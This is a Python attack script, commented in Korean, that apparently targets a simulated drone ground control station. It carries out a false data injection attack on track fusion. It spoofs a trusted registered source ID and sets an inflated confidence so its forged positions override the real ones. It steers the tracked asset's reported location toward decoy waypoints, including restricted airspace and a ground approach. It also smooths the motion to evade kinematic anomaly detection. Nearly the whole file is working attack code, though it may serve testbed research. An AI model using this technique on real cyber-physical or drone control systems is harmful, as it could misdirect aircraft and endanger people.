"""
Track Fusion FDI (False Data Injection) 공격
독창 시나리오 | arXiv:2104.09907 "FDI on Cyber-Physical State Estimation" 계열

GCS state.py _source_sample_from_external 취약점:
  source_id가 source_registry 키("mavlink-udp-adapter", base_confidence=0.92)와
  일치하면 정상 C2 게이트웨이로 분류된다.

  또한 tracks_payload에서 소스를 confidence 내림차순으로 정렬해
  최고 신뢰도 소스를 fused_position으로 채택:
    sources.sort(key=lambda item: (item["stale"], -item["confidence"], ...))

공격 전략:
  1단계 — source_registry에 등록된 합법적 소스 ID("mavlink-udp-adapter")로 위장
  2단계 — track_confidence=0.97 (실제 시뮬레이션 기준치 0.82보다 높게) 설정
  3단계 — 대상 자산의 fused_position을 공격자가 원하는 좌표로 교체
  4단계 — 점진적 이동으로 kinematic 이상 탐지 회피
"""
from __future__ import annotations

import argparse
import math
import random
import time
from .common import GcsClient, wait_for_gcs


# GCS source_registry에 등록된 합법 소스 ID (base_confidence = 0.92)
HIJACKED_SOURCE_ID = "mavlink-udp-adapter"
HIJACK_CONFIDENCE = 0.97   # 시뮬레이션(0.82), 실제 MAVLink(0.92)보다 높음

# 대상 자산을 유인할 위장 위치 (실제 임무 구역 밖 / 위험 지역)
DECOY_WAYPOINTS = [
    [350.0, -400.0, 95.0],   # 구역 경계 밖
    [420.0, -450.0, 80.0],   # 금지 공역 방향
    [480.0, -500.0, 60.0],   # 착륙 유도
    [500.0, -520.0, 20.0],   # 지상 접근
]


def _smooth_move(current: list[float], target: list[float], t: float) -> list[float]:
    """부드러운 이동으로 급격한 위치 변화(kinematic 이상) 방지"""
    alpha = max(0.0, min(1.0, t * 0.12))  # t 음수 방지: clamp [0, 1]
    return [round(c + (tgt - c) * alpha + random.gauss(0, 0.3), 2) for c, tgt in zip(current, target)]


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Track Fusion FDI 공격")
    parser.add_argument("--service-url",   default="http://dah-gcs:8080")
    parser.add_argument("--target-asset",  default="small-dronebot-01")
    parser.add_argument("--interval-s",    type=float, default=0.8)
    parser.add_argument("--duration-s",    type=float, default=100.0)
    parser.add_argument("--hijack-source", default=HIJACKED_SOURCE_ID,
                        help="위장할 source_registry ID (기본: mavlink-udp-adapter)")
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    # 현재 실제 위치 조회 (이동 시작점 파악)
    start_pos = [200.0, -220.0, 95.0]  # fallback
    try:
        tracks = client.get("/api/tracks")
        for track in (tracks.get("payload", {}).get("tracks") or []):
            if track.get("asset_id") == args.target_asset:
                start_pos = list(track["fused_position"])
                break
        print(f"[fdi_fusion] 실제 위치 확인: {start_pos}", flush=True)
    except Exception as e:
        print(f"[fdi_fusion] 위치 조회 실패, fallback 사용: {e}", flush=True)

    print(
        f"[fdi_fusion] 공격 시작\n"
        f"  대상 자산: {args.target_asset}\n"
        f"  위장 소스: {args.hijack_source} (신뢰도 {HIJACK_CONFIDENCE})\n"
        f"  경유 위장 좌표: {DECOY_WAYPOINTS}",
        flush=True,
    )

    start = time.time()
    tick = 0
    current_spoof = list(start_pos)
    waypoint_idx = 0
    wp_start_time = time.time()  # 현재 경유점을 향해 출발한 시각

    while (time.time() - start) < args.duration_s:
        elapsed = time.time() - start

        # 현재 목표 위장 경유점으로 천천히 이동
        target_wp = DECOY_WAYPOINTS[waypoint_idx % len(DECOY_WAYPOINTS)]
        t_in_wp = time.time() - wp_start_time  # 현재 경유점 향해 이동한 시간
        current_spoof = _smooth_move(current_spoof, target_wp, t_in_wp)

        # 목표 경유점에 충분히 근접하면 다음 경유점으로
        dist = math.sqrt(sum((a - b) ** 2 for a, b in zip(current_spoof, target_wp)))
        if dist < 12:
            waypoint_idx += 1
            wp_start_time = time.time()  # 경유점 타이머 리셋
            print(f"[fdi_fusion] 경유점 {waypoint_idx} 도달 → 다음 목표로", flush=True)

        # 물리적으로 그럴듯한 속도 계산 (이전 위치와의 차이)
        vel = [
            (current_spoof[0] - start_pos[0]) * 0.1 + random.gauss(0, 0.5),
            (current_spoof[1] - start_pos[1]) * 0.1 + random.gauss(0, 0.5),
            (current_spoof[2] - start_pos[2]) * 0.02,
        ]
        heading = (math.degrees(math.atan2(vel[1], vel[0]))) % 360

        try:
            client.post("/api/telemetry/ingest", {
                "asset_id":         args.target_asset,
                "time_s":           tick,
                "position":         current_spoof,
                "velocity_mps":     [round(v, 2) for v in vel],
                "heading_deg":      round(heading, 1),
                "status":           "edge-live",
                "mission_id":       "dronebot-local-recon",
                # 핵심: 합법적 source_registry ID 사용 → base_confidence=0.92 취득
                "source":           "FDI-FUSION",
                "source_id":        args.hijack_source,   # "mavlink-udp-adapter" 위장
                "source_type":      "mavlink_gateway",
                "source_authority": "C2 / Ground Control",  # 실제 registry 값 그대로
                # 명시적 confidence가 base_confidence보다 높으면 명시값 우선 사용
                "track_confidence": HIJACK_CONFIDENCE,        # 0.97 → fused_position 탈취
                "link_profile":     "mavlink_udp",
                "c2_node_id":       "ground-control-east",
                "battery_wh":       680.0,
            })
            print(
                f"[fdi_fusion] tick={tick:04d} | 위장소스={args.hijack_source} "
                f"| conf={HIJACK_CONFIDENCE} | pos=[{current_spoof[0]:.1f},"
                f"{current_spoof[1]:.1f},{current_spoof[2]:.1f}] | dist2wp={dist:.1f}m",
                flush=True,
            )
        except Exception as e:
            print(f"[fdi_fusion] 주입 오류: {e}", flush=True)

        start_pos = list(current_spoof)  # 다음 틱의 속도 계산 기준 갱신
        tick += 1
        time.sleep(args.interval_s)

    print(
        f"[fdi_fusion] 공격 종료 — 최종 위장 위치: {current_spoof} "
        f"| 실제 위치와 추정 편차: {dist:.1f}m",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
